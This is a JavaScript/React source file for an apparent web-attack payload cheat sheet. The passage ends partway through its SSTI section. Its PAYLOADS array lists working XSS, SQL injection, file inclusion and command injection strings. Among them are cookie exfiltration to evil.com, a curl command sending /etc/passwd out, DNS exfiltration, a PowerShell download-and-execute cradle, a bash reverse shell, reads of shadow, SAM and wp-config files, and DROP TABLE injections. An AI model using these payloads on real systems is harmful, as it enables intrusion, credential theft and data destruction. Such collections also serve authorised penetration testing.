import { useState, useMemo } from "react";
import { Card } from "../components/ui/Card.jsx";
import { CopyButton } from "../components/ui/CopyButton.jsx";
import {
  Search,
  Shield,
  Database,
  FolderOpen,
  Terminal,
  Braces,
  FileCode,
  Tag,
  Globe,
  Key,
  ExternalLink,
  Box,
  Unlock,
  ShieldOff,
} from "lucide-react";
import { ToolHelp } from '../components/ui/ToolHelp.jsx';
import { VariableBar } from '../components/ui/VariableBar.jsx';
import { useVariables } from '../lib/variables.js';

const mono = "JetBrains Mono, monospace";
const heading = "Space Grotesk, sans-serif";

const CATEGORY_META = {
  XSS: { label: "XSS", color: "#FB7185", icon: Shield },
  SQLi: { label: "SQLi", color: "#A78BFA", icon: Database },
  LFI: { label: "LFI/RFI", color: "#FBBF24", icon: FolderOpen },
  CMDi: { label: "CMDi", color: "#6EE7B7", icon: Terminal },
  SSTI: { label: "SSTI", color: "#7DD3FC", icon: Braces },
  XXE: { label: "XXE", color: "#F472B6", icon: FileCode },
  SSRF: { label: "SSRF", color: "#38BDF8", icon: Globe },
  IDOR: { label: "IDOR", color: "#F59E0B", icon: Key },
  OpenRedirect: {
    label: "Open Redirect",
    color: "#22D3EE",
    icon: ExternalLink,
  },
  Deserialization: {
    label: "Deserialization",
    color: "#E879F9",
    icon: Box,
  },
  CORS: { label: "CORS", color: "#FB923C", icon: Unlock },
  AuthBypass: { label: "Auth Bypass", color: "#EF4444", icon: ShieldOff },
};

const PAYLOADS = [
  // ── XSS ──
  {
    id: "xss-01",
    cat: "XSS",
    tags: ["basic"],
    desc: "Classic script alert",
    payload: "<script>alert(1)</script>",
  },
  {
    id: "xss-02",
    cat: "XSS",
    tags: ["basic"],
    desc: "Image onerror",
    payload: "<img src=x onerror=alert(1)>",
  },
  {
    id: "xss-03",
    cat: "XSS",
    tags: ["basic"],
    desc: "SVG onload",
    payload: "<svg/onload=alert(1)>",
  },
  {
    id: "xss-04",
    cat: "XSS",
    tags: ["event handler"],
    desc: "Body onload",
    payload: "<body onload=alert(1)>",
  },
  {
    id: "xss-05",
    cat: "XSS",
    tags: ["event handler"],
    desc: "Input onfocus with autofocus",
    payload: "<input onfocus=alert(1) autofocus>",
  },
  {
    id: "xss-06",
    cat: "XSS",
    tags: ["event handler"],
    desc: "Marquee onstart",
    payload: "<marquee onstart=alert(1)>",
  },
  {
    id: "xss-07",
    cat: "XSS",
    tags: ["event handler"],
    desc: "Details ontoggle",
    payload: "<details open ontoggle=alert(1)>",
  },
  {
    id: "xss-08",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Mixed case bypass",
    payload: "<ScRiPt>alert(1)</ScRiPt>",
  },
  {
    id: "xss-09",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "HTML entity encoded alert",
    payload: '<img src=x onerror="&#97;lert(1)">',
  },
  {
    id: "xss-10",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "SVG with script via xmlns",
    payload: "<svg><script>alert(1)</script></svg>",
  },
  {
    id: "xss-11",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Double encoding bypass",
    payload: "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
  },
  {
    id: "xss-12",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Template literal bypass",
    payload: "<script>alert`1`</script>",
  },
  {
    id: "xss-13",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "JavaScript URI",
    payload: "javascript:alert(1)",
  },
  {
    id: "xss-14",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "Data URI XSS",
    payload: "data:text/html,<script>alert(1)</script>",
  },
  {
    id: "xss-15",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "Double-quote breakout",
    payload: '"><script>alert(1)</script>',
  },
  {
    id: "xss-16",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "Single-quote breakout",
    payload: "'><script>alert(1)</script>",
  },
  {
    id: "xss-17",
    cat: "XSS",
    tags: ["cookie theft"],
    desc: "Cookie exfiltration via location",
    payload:
      "<script>document.location='http://evil.com/?c='+document.cookie</script>",
  },
  {
    id: "xss-18",
    cat: "XSS",
    tags: ["cookie theft"],
    desc: "Cookie exfiltration via fetch",
    payload: "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
  },
  {
    id: "xss-19",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Iframe srcdoc XSS",
    payload: '<iframe srcdoc="<script>alert(1)</script>">',
  },
  {
    id: "xss-20",
    cat: "XSS",
    tags: ["polyglot"],
    desc: "XSS polyglot payload",
    payload:
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
  },
  {
    id: "xss-21",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "DOM XSS via location.hash + eval sink",
    payload:
      '"><img src=x onerror=eval(decodeURIComponent(location.hash.slice(1)))>#alert%281%29',
  },
  {
    id: "xss-22",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "DOM XSS document.write sink",
    payload:
      "<script>document.write(location.search)</script>?<img src=x onerror=alert(1)>",
  },
  {
    id: "xss-23",
    cat: "XSS",
    tags: ["mutation"],
    desc: "Mutation XSS via broken noscript parsing",
    payload:
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>',
  },
  {
    id: "xss-24",
    cat: "XSS",
    tags: ["polyglot"],
    desc: "Polyglot HTML/JS breakout",
    payload: "'\"--></script><svg onload=alert(1)>",
  },
  {
    id: "xss-25",
    cat: "XSS",
    tags: ["csp"],
    desc: "CSP strict-dynamic / nonce gap (test hosted script allowlist)",
    payload:
      "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app ng-csp>{{$new.constructor('alert(1)')()}}</div>",
  },
  {
    id: "xss-26",
    cat: "XSS",
    tags: ["dangling markup"],
    desc: "Dangling markup injection (open img src steals following HTML)",
    payload: '<img src="https://YOUR-COLLAB.example/?c=',
  },
  {
    id: "xss-27",
    cat: "XSS",
    tags: ["pdf"],
    desc: "XSS via PDF OpenAction (embed in PDF object stream)",
    payload: "/OpenAction << /S /JavaScript /JS (app.alert\\(1\\);) >>",
  },
  {
    id: "xss-28",
    cat: "XSS",
    tags: ["template"],
    desc: "Client template injection reflected into HTML attribute",
    payload: '"><div title="${alert(1)}">',
  },
  {
    id: "xss-29",
    cat: "XSS",
    tags: ["angular"],
    desc: "AngularJS template XSS via constructor chain",
    payload: "{{constructor.constructor('alert(1)')()}}",
  },
  {
    id: "xss-30",
    cat: "XSS",
    tags: ["vue"],
    desc: "Vue 2 template expression RCE-style (legacy unsafe compiler)",
    payload: "{{constructor.constructor('alert(1)')()}}",
  },
  {
    id: "xss-31",
    cat: "XSS",
    tags: ["react"],
    desc: "React dangerouslySetInnerHTML sink (illustrative payload)",
    payload: "<img src=x onerror=alert(1)>",
  },
  {
    id: "xss-32",
    cat: "XSS",
    tags: ["svg", "upload"],
    desc: "XSS via SVG file upload",
    payload:
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
  },
  {
    id: "xss-33",
    cat: "XSS",
    tags: ["json"],
    desc: "Breakout from JSON string into HTML context",
    payload: "\\u003cimg src=x onerror=alert(1)\\u003e",
  },
  {
    id: "xss-34",
    cat: "XSS",
    tags: ["websocket"],
    desc: "XSS when WS message is written to DOM (client test)",
    payload: "<img src=x onerror=alert(document.domain)>",
  },
  {
    id: "xss-35",
    cat: "XSS",
    tags: ["postmessage"],
    desc: "Unsafe postMessage handler (payload for child frame)",
    payload: "<svg onload=alert(parent.document.domain)>",
  },
  {
    id: "xss-36",
    cat: "XSS",
    tags: ["blind"],
    desc: "Blind XSS external script (replace YOUR-COLLAB)",
    payload: '<script src="https://YOUR-COLLAB.example/bxss.js"></script>',
  },
  {
    id: "xss-37",
    cat: "XSS",
    tags: ["mxss"],
    desc: "mXSS via SVG foreignObject mutation",
    payload:
      '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
  },
  {
    id: "xss-38",
    cat: "XSS",
    tags: ["meta"],
    desc: "XSS via meta refresh javascript URL",
    payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  },
  {
    id: "xss-39",
    cat: "XSS",
    tags: ["xml"],
    desc: "XSS via XML + XSLT stylesheet href",
    payload:
      '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://YOUR-COLLAB.example/evil.xsl"?><root/>',
  },
  {
    id: "xss-40",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Mixed-case tag and event filter evasion",
    payload: "<IMg SRC=x OnErRoR=alert(1)>",
  },
  {
    id: "xss-41",
    cat: "XSS",
    tags: ["filter bypass", "encoding"],
    desc: "Decimal HTML entity encoding",
    payload: "&#60;img src=x onerror=alert(1)&#62;",
  },
  {
    id: "xss-42",
    cat: "XSS",
    tags: ["filter bypass", "encoding"],
    desc: "Hex escape in JS string context",
    payload: "\\x3cimg src=x onerror=alert(1)\\x3e",
  },
  {
    id: "xss-43",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "Script tag with slash to break tokenizer",
    payload: "<script/x>alert(1)</script>",
  },
  {
    id: "xss-44",
    cat: "XSS",
    tags: ["filter bypass"],
    desc: "SVG onload with parenthesis encoding",
    payload: "<svg/onload=alert&#40;1&#41;>",
  },
  {
    id: "xss-45",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "base href + relative script hijack",
    payload: '<base href="https://evil.com/"><script src="app.js"></script>',
  },
  {
    id: "xss-46",
    cat: "XSS",
    tags: ["dom-based"],
    desc: "DOM XSS innerHTML assignment sink",
    payload:
      "<div id=x></div><script>document.getElementById('x').innerHTML=location.hash.slice(1)</script>",
  },
  {
    id: "xss-47",
    cat: "XSS",
    tags: ["filter bypass", "encoding"],
    desc: "Unicode normalized smuggling idea",
    payload: "<img src=x onerror=alert(1)>",
  },
  {
    id: "xss-48",
    cat: "XSS",
    tags: ["csp"],
    desc: "JSONP callback parameter injection",
    payload: "?callback=alert(1)//",
  },
  {
    id: "xss-49",
    cat: "XSS",
    tags: ["event handler"],
    desc: "onpointerrawupdate (Chromium)",
    payload: "<div onpointerrawupdate=alert(1)>move mouse</div>",
  },
  {
    id: "xss-50",
    cat: "XSS",
    tags: ["stealth"],
    desc: "Tiny fetch beacon on error",
    payload:
      '<img src=x onerror=fetch("//YOUR-COLLAB.example/"+document.cookie)>',
  },

  // ── SQLi ──
  {
    id: "sqli-01",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "Classic OR bypass",
    payload: "' OR 1=1--",
  },
  {
    id: "sqli-02",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "Admin comment bypass",
    payload: "admin'--",
  },
  {
    id: "sqli-03",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "String equality bypass",
    payload: "' OR '1'='1",
  },
  {
    id: "sqli-04",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "Double-dash with space",
    payload: "' OR 1=1-- -",
  },
  {
    id: "sqli-05",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "Hash comment bypass",
    payload: "' OR 1=1#",
  },
  {
    id: "sqli-06",
    cat: "SQLi",
    tags: ["union"],
    desc: "Column count detection (ORDER BY)",
    payload: "' ORDER BY 1--",
  },
  {
    id: "sqli-07",
    cat: "SQLi",
    tags: ["union"],
    desc: "NULL-based column detection",
    payload: "' UNION SELECT NULL,NULL,NULL--",
  },
  {
    id: "sqli-08",
    cat: "SQLi",
    tags: ["union"],
    desc: "Extract database version",
    payload: "' UNION SELECT NULL,version(),NULL--",
  },
  {
    id: "sqli-09",
    cat: "SQLi",
    tags: ["union"],
    desc: "Extract table names",
    payload:
      "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
  },
  {
    id: "sqli-10",
    cat: "SQLi",
    tags: ["union"],
    desc: "Extract column names",
    payload:
      "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
  },
  {
    id: "sqli-11",
    cat: "SQLi",
    tags: ["error-based"],
    desc: "ExtractValue error-based (MySQL)",
    payload: "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
  },
  {
    id: "sqli-12",
    cat: "SQLi",
    tags: ["error-based"],
    desc: "UpdateXML error-based (MySQL)",
    payload: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
  },
  {
    id: "sqli-13",
    cat: "SQLi",
    tags: ["blind"],
    desc: "Boolean-based blind",
    payload: "' AND 1=1--",
  },
  {
    id: "sqli-14",
    cat: "SQLi",
    tags: ["blind"],
    desc: "Boolean-based substring",
    payload: "' AND SUBSTRING(version(),1,1)='5'--",
  },
  {
    id: "sqli-15",
    cat: "SQLi",
    tags: ["blind", "time-based"],
    desc: "Time-based blind (SLEEP)",
    payload: "' AND SLEEP(5)--",
  },
  {
    id: "sqli-16",
    cat: "SQLi",
    tags: ["blind", "time-based"],
    desc: "Time-based blind (BENCHMARK)",
    payload: "' AND BENCHMARK(5000000,SHA1('test'))--",
  },
  {
    id: "sqli-17",
    cat: "SQLi",
    tags: ["blind", "time-based"],
    desc: "Time-based conditional",
    payload: "' AND IF(1=1,SLEEP(5),0)--",
  },
  {
    id: "sqli-18",
    cat: "SQLi",
    tags: ["stacked"],
    desc: "Stacked query - create user",
    payload:
      "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
  },
  {
    id: "sqli-19",
    cat: "SQLi",
    tags: ["stacked"],
    desc: "Stacked query - drop table",
    payload: "'; DROP TABLE users--",
  },
  {
    id: "sqli-20",
    cat: "SQLi",
    tags: ["auth bypass"],
    desc: "Bypass with parentheses",
    payload: "') OR ('1'='1",
  },
  {
    id: "sqli-21",
    cat: "SQLi",
    tags: ["error-based", "mysql"],
    desc: "MySQL duplicate entry error-based (extract from subquery)",
    payload:
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  },
  {
    id: "sqli-22",
    cat: "SQLi",
    tags: ["error-based", "mssql"],
    desc: "MSSQL error-based via convert/cast",
    payload: "' AND 1=CONVERT(int,(SELECT @@version))--",
  },
  {
    id: "sqli-23",
    cat: "SQLi",
    tags: ["error-based", "postgresql"],
    desc: "PostgreSQL cast error-based",
    payload: "' AND 1=CAST((SELECT version()) AS int)--",
  },
  {
    id: "sqli-24",
    cat: "SQLi",
    tags: ["error-based", "oracle"],
    desc: "Oracle error-based via XMLType",
    payload:
      "' AND (SELECT XMLType('<'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'>') FROM dual) IS NOT NULL--",
  },
  {
    id: "sqli-25",
    cat: "SQLi",
    tags: ["union"],
    desc: "UNION column enumeration step-up",
    payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
  },
  {
    id: "sqli-26",
    cat: "SQLi",
    tags: ["union"],
    desc: "UNION find printable column (MySQL)",
    payload: "' UNION SELECT 'a',NULL,NULL--",
  },
  {
    id: "sqli-27",
    cat: "SQLi",
    tags: ["blind", "time-based", "postgresql"],
    desc: "PostgreSQL time-based blind",
    payload: "'; SELECT pg_sleep(5)--",
  },
  {
    id: "sqli-28",
    cat: "SQLi",
    tags: ["blind", "time-based", "mssql"],
    desc: "MSSQL WAITFOR DELAY blind",
    payload: "'; WAITFOR DELAY '0:0:5'--",
  },
  {
    id: "sqli-29",
    cat: "SQLi",
    tags: ["blind", "boolean"],
    desc: "Boolean blind length probe",
    payload: "' AND LENGTH(database())>0--",
  },
  {
    id: "sqli-30",
    cat: "SQLi",
    tags: ["blind", "boolean", "oracle"],
    desc: "Oracle boolean via ASCII substring",
    payload:
      "' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>50--",
  },
  {
    id: "sqli-31",
    cat: "SQLi",
    tags: ["stacked", "mssql"],
    desc: "MSSQL stacked xp_cmdshell (if enabled)",
    payload: "'; EXEC xp_cmdshell('whoami')--",
  },
  {
    id: "sqli-32",
    cat: "SQLi",
    tags: ["waf bypass"],
    desc: "WAF bypass inline comments",
    payload: "'/**/OR/**/1=1--",
  },
  {
    id: "sqli-33",
    cat: "SQLi",
    tags: ["waf bypass"],
    desc: "WAF bypass URL-encoded keywords",
    payload: "' %4fR 1=1--",
  },
  {
    id: "sqli-34",
    cat: "SQLi",
    tags: ["second-order"],
    desc: "Second-order idea: store payload, trigger in different query",
    payload: "admin'/* stored in profile, executed in admin report */",
  },
  {
    id: "sqli-35",
    cat: "SQLi",
    tags: ["nosql", "mongodb"],
    desc: "MongoDB $ne auth bypass",
    payload: '{"username": {"$ne": null}, "password": {"$ne": null}}',
  },
  {
    id: "sqli-36",
    cat: "SQLi",
    tags: ["nosql", "mongodb"],
    desc: "MongoDB $where JavaScript injection",
    payload: "'; return true; var foo='",
  },
  {
    id: "sqli-37",
    cat: "SQLi",
    tags: ["json"],
    desc: "SQLi via JSON PostgreSQL operator",
    payload: "1' OR (SELECT data->>'user' FROM profiles LIMIT 1) IS NOT NULL--",
  },
  {
    id: "sqli-44",
    cat: "SQLi",
    tags: ["xml"],
    desc: "SQL Server FOR XML PATH concatenation exfil pattern",
    payload: "' AND 1=(SELECT name+':'+password FROM users FOR XML PATH(''))--",
  },
  {
    id: "sqli-39",
    cat: "SQLi",
    tags: ["filter bypass"],
    desc: "MySQL version() exfiltration",
    payload: "' UNION SELECT NULL,@@version,NULL--",
  },
  {
    id: "sqli-40",
    cat: "SQLi",
    tags: ["filter bypass"],
    desc: "MySQL current user",
    payload: "' UNION SELECT NULL,user(),NULL--",
  },
  {
    id: "sqli-41",
    cat: "SQLi",
    tags: ["postgresql"],
    desc: "PostgreSQL current_user + version",
    payload: "' UNION SELECT NULL,version()||':'||current_user,NULL--",
  },
  {
    id: "sqli-42",
    cat: "SQLi",
    tags: ["oracle"],
    desc: "Oracle SYS.DATABASE_NAME + user",
    payload:
      "' UNION SELECT NULL,user||':'||SYS.DATABASE_NAME,NULL FROM dual--",
  },
  {
    id: "sqli-43",
    cat: "SQLi",
    tags: ["mssql"],
    desc: "MSSQL SYSTEM_USER + DB_NAME",
    payload: "' UNION SELECT NULL,SYSTEM_USER+':'+DB_NAME(),NULL--",
  },
  {
    id: "sqli-38",
    cat: "SQLi",
    tags: ["filter bypass"],
    desc: "Comment obfuscation between keywords",
    payload:
      "' UnIoN/**/SeLeCt NULL,table_name,NULL FROM information_schema.tables--",
  },
  {
    id: "sqli-45",
    cat: "SQLi",
    tags: ["blind", "time-based", "oracle"],
    desc: "Oracle time-based DBMS_LOCK.SLEEP",
    payload: "' AND 1=DBMS_LOCK.SLEEP(5)--",
  },
  {
    id: "sqli-46",
    cat: "SQLi",
    tags: ["sqlite"],
    desc: "SQLite sqlite_version() probe",
    payload: "' UNION SELECT sqlite_version(),NULL,NULL--",
  },
  {
    id: "sqli-47",
    cat: "SQLi",
    tags: ["sqlite", "blind"],
    desc: "SQLite time delay via heavy query",
    payload: "' AND randomblob(100000000)--",
  },

  // ── LFI/RFI ──
  {
    id: "lfi-01",
    cat: "LFI",
    tags: ["basic"],
    desc: "Linux passwd traversal",
    payload: "../../../../etc/passwd",
  },
  {
    id: "lfi-02",
    cat: "LFI",
    tags: ["basic"],
    desc: "Deep traversal /etc/passwd",
    payload: "../../../../../../etc/passwd",
  },
  {
    id: "lfi-03",
    cat: "LFI",
    tags: ["filter bypass"],
    desc: "Double-dot slash bypass",
    payload: "....//....//....//etc/passwd",
  },
  {
    id: "lfi-04",
    cat: "LFI",
    tags: ["filter bypass"],
    desc: "URL-encoded traversal",
    payload: "..%2f..%2f..%2f..%2fetc%2fpasswd",
  },
  {
    id: "lfi-05",
    cat: "LFI",
    tags: ["filter bypass"],
    desc: "Null byte termination (PHP < 5.3)",
    payload: "../../../../etc/passwd%00",
  },
  {
    id: "lfi-06",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "PHP base64 filter",
    payload: "php://filter/convert.base64-encode/resource=index.php",
  },
  {
    id: "lfi-07",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "PHP input wrapper (RCE)",
    payload: "php://input",
  },
  {
    id: "lfi-08",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "Expect wrapper (RCE)",
    payload: "expect://id",
  },
  {
    id: "lfi-09",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "Data wrapper code exec",
    payload:
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
  },
  {
    id: "lfi-10",
    cat: "LFI",
    tags: ["log poisoning"],
    desc: "Apache access log",
    payload: "/var/log/apache2/access.log",
  },
  {
    id: "lfi-11",
    cat: "LFI",
    tags: ["log poisoning"],
    desc: "Nginx access log",
    payload: "/var/log/nginx/access.log",
  },
  {
    id: "lfi-12",
    cat: "LFI",
    tags: ["proc"],
    desc: "/proc/self/environ",
    payload: "/proc/self/environ",
  },
  {
    id: "lfi-13",
    cat: "LFI",
    tags: ["proc"],
    desc: "/proc/self/fd (bruteforce FD)",
    payload: "/proc/self/fd/0",
  },
  {
    id: "lfi-14",
    cat: "LFI",
    tags: ["windows"],
    desc: "Windows hosts file",
    payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  },
  {
    id: "lfi-15",
    cat: "LFI",
    tags: ["windows"],
    desc: "Windows SAM file",
    payload: "..\\..\\..\\..\\windows\\system32\\config\\SAM",
  },
  {
    id: "lfi-16",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "php://filter chain read source (zlib)",
    payload:
      "php://filter/zlib.inflate/convert.base64-encode/resource=index.php",
  },
  {
    id: "lfi-17",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "php://filter rot13 + base64 (bypass simple filters)",
    payload:
      "php://filter/read=string.rot13|string.toupper|convert.base64-encode/resource=index.php",
  },
  {
    id: "lfi-18",
    cat: "LFI",
    tags: ["php wrapper"],
    desc: "zip:// wrapper inside uploaded zip",
    payload: "zip:///var/www/shell.zip#shell.php",
  },
  {
    id: "lfi-19",
    cat: "LFI",
    tags: ["filter bypass"],
    desc: "Double URL encoding traversal",
    payload: "..%252f..%252f..%252f..%252fetc%252fpasswd",
  },
  {
    id: "lfi-20",
    cat: "LFI",
    tags: ["sensitive files"],
    desc: "Linux shadow (requires root read)",
    payload: "../../../../etc/shadow",
  },
  {
    id: "lfi-21",
    cat: "LFI",
    tags: ["sensitive files"],
    desc: "Linux hosts file",
    payload: "../../../../etc/hosts",
  },
  {
    id: "lfi-22",
    cat: "LFI",
    tags: ["sensitive files", "wordpress"],
    desc: "WordPress wp-config.php",
    payload: "../../../../var/www/html/wp-config.php",
  },
  {
    id: "lfi-23",
    cat: "LFI",
    tags: ["sensitive files", "iis"],
    desc: "ASP.NET web.config",
    payload: "..\\..\\..\\web.config",
  },
  {
    id: "lfi-24",
    cat: "LFI",
    tags: ["sensitive files", "apache"],
    desc: "Apache .htaccess",
    payload: "../../../../var/www/html/.htaccess",
  },
  {
    id: "lfi-25",
    cat: "LFI",
    tags: ["proc"],
    desc: "/proc/self/cmdline",
    payload: "/proc/self/cmdline",
  },
  {
    id: "lfi-26",
    cat: "LFI",
    tags: ["proc"],
    desc: "/proc/self/maps (memory maps)",
    payload: "/proc/self/maps",
  },
  {
    id: "lfi-27",
    cat: "LFI",
    tags: ["log poisoning"],
    desc: "PHP session file path (guess sessid)",
    payload: "/var/lib/php/sessions/sess_PHPSESSID",
  },
  {
    id: "lfi-28",
    cat: "LFI",
    tags: ["log poisoning"],
    desc: "SSH auth log poisoning vector",
    payload: "/var/log/auth.log",
  },
  {
    id: "lfi-29",
    cat: "LFI",
    tags: ["rfi"],
    desc: "RFI remote PHP include",
    payload: "http://evil.com/shell.txt",
  },
  {
    id: "lfi-30",
    cat: "LFI",
    tags: ["rfi"],
    desc: "RFI with null byte (legacy PHP)",
    payload: "http://evil.com/shell.txt%00",
  },

  // ── CMDi ──
  {
    id: "cmdi-01",
    cat: "CMDi",
    tags: ["separator"],
    desc: "Semicolon separator",
    payload: "; id",
  },
  {
    id: "cmdi-02",
    cat: "CMDi",
    tags: ["separator"],
    desc: "Pipe",
    payload: "| id",
  },
  {
    id: "cmdi-03",
    cat: "CMDi",
    tags: ["separator"],
    desc: "OR operator",
    payload: "|| id",
  },
  {
    id: "cmdi-04",
    cat: "CMDi",
    tags: ["separator"],
    desc: "AND operator",
    payload: "&& id",
  },
  {
    id: "cmdi-05",
    cat: "CMDi",
    tags: ["separator"],
    desc: "Backtick substitution",
    payload: "`id`",
  },
  {
    id: "cmdi-06",
    cat: "CMDi",
    tags: ["separator"],
    desc: "Dollar substitution",
    payload: "$(id)",
  },
  {
    id: "cmdi-07",
    cat: "CMDi",
    tags: ["separator"],
    desc: "Newline injection",
    payload: "%0aid",
  },
  {
    id: "cmdi-08",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "IFS space bypass",
    payload: "cat${IFS}/etc/passwd",
  },
  {
    id: "cmdi-09",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "Brace expansion bypass",
    payload: "{cat,/etc/passwd}",
  },
  {
    id: "cmdi-10",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "Hex-encoded space bypass",
    payload: "cat$'\\x20'/etc/passwd",
  },
  {
    id: "cmdi-11",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "Wildcard bypass (cat /etc/passwd)",
    payload: "/???/??t /???/??ss??",
  },
  {
    id: "cmdi-12",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "Variable concatenation bypass",
    payload: "a=c;b=at;$a$b /etc/passwd",
  },
  {
    id: "cmdi-13",
    cat: "CMDi",
    tags: ["blind"],
    desc: "Time-based blind (sleep)",
    payload: "; sleep 5",
  },
  {
    id: "cmdi-14",
    cat: "CMDi",
    tags: ["blind"],
    desc: "DNS exfiltration",
    payload: "; nslookup $(whoami).evil.com",
  },
  {
    id: "cmdi-15",
    cat: "CMDi",
    tags: ["blind"],
    desc: "HTTP exfiltration",
    payload: "; curl http://evil.com/$(whoami)",
  },
  {
    id: "cmdi-16",
    cat: "CMDi",
    tags: ["bash"],
    desc: "Bash process substitution read file",
    payload: "$(< /etc/passwd)",
  },
  {
    id: "cmdi-17",
    cat: "CMDi",
    tags: ["powershell"],
    desc: "PowerShell call operator",
    payload:
      "; powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')\"",
  },
  {
    id: "cmdi-18",
    cat: "CMDi",
    tags: ["python"],
    desc: "Python -c subprocess",
    payload: "; python3 -c \"import os;os.system('id')\"",
  },
  {
    id: "cmdi-19",
    cat: "CMDi",
    tags: ["perl"],
    desc: "Perl system one-liner",
    payload: "; perl -e 'system(\"id\")'",
  },
  {
    id: "cmdi-20",
    cat: "CMDi",
    tags: ["ruby"],
    desc: "Ruby backtick execution",
    payload: "; ruby -e '`id`'",
  },
  {
    id: "cmdi-21",
    cat: "CMDi",
    tags: ["blind", "dns"],
    desc: "DNS exfil with base64 chunking idea",
    payload: "; host $(id|base64|tr -d '\\n').YOUR-COLLAB.example",
  },
  {
    id: "cmdi-22",
    cat: "CMDi",
    tags: ["blind", "time-based"],
    desc: "Time-based blind ping flood",
    payload: "| ping -c 5 127.0.0.1",
  },
  {
    id: "cmdi-23",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "Whitespace via tab",
    payload: ";%09id",
  },
  {
    id: "cmdi-24",
    cat: "CMDi",
    tags: ["chained"],
    desc: "Chained read + exfil",
    payload: "; cat /etc/passwd | curl -d @- http://evil.com/",
  },
  {
    id: "cmdi-25",
    cat: "CMDi",
    tags: ["reverse shell"],
    desc: "Bash reverse shell one-liner",
    payload: "; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1",
  },
  {
    id: "cmdi-26",
    cat: "CMDi",
    tags: ["wildcard"],
    desc: "Wildcard argv injection /usr/bin/*",
    payload: "/???/??t /???/p??s??",
  },
  {
    id: "cmdi-27",
    cat: "CMDi",
    tags: ["argument injection"],
    desc: "Tar style argument injection",
    payload: "--checkpoint=1 --checkpoint-action=exec=sh shell.sh",
  },
  {
    id: "cmdi-28",
    cat: "CMDi",
    tags: ["windows"],
    desc: "Windows cmd chaining with &",
    payload: "& whoami",
  },
  {
    id: "cmdi-29",
    cat: "CMDi",
    tags: ["windows", "powershell"],
    desc: "PowerShell encoded command flag",
    payload: "; powershell -EncodedCommand SQBuAHQAKgA=",
  },
  {
    id: "cmdi-30",
    cat: "CMDi",
    tags: ["filter bypass"],
    desc: "String termination bypass with single quote",
    payload: "';id;'",
  },

  // ── SSTI ──
  {
    id: "ssti-01",
    cat: "SSTI",
    tags: ["detection"],
    desc: "Jinja2/Twig multiplication test",
    payload: "{{7*7}}",
  },
  {
    id: "ssti-02",
    cat: "SSTI",
    tags: ["detection"],
    desc: "Freemarker/Java EL test",
    payload: "${7*7}",
  },
  {
    id: "ssti-03",
    cat: "SSTI",
    tags: ["detection"],
    desc: "ERB/EJS detection",
    payload: "<%= 7*7 %>",
  },
  {
    id: "ssti-04",
    cat: "SSTI",
    tags: ["jinja2"],
    desc: "Jinja2 config dump",
    payload: "{{config}}",
  },
  {
    id: "ssti-05",
    cat: "SSTI",
    tags: ["jinja2"],
    desc: "Jinja2 RCE via MRO",
    payload:
      "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
  },
  {
    id: "ssti-06",
    cat: "SSTI",
    tags: ["jinja2"],
    desc: "Jinja2 RCE via cycler",
